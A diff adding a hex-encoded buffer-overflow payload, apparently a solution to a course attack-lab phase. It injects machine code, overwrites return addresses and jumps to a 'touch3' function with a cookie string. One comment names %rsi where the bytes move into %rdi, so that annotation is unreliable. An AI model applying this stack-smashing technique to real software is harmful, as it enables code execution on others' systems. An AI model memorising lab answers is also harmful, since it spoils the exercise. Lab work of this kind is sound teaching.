@@ -1,0 +1,7 @@
+48 c7 c7 58 c4 67 55 c3 /* code movq 0x5567c458 %rsi  */
+c3 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+28 c4 67 55 00 00 00 00 /* return address */
+30 c4 67 55 00 00 00 00 /* return2 address ($rsp) */
+0c 19 40 00 00 00 00 00 /* touch3 address */
+37 66 39 37 36 32 66 61 /* cookie string */
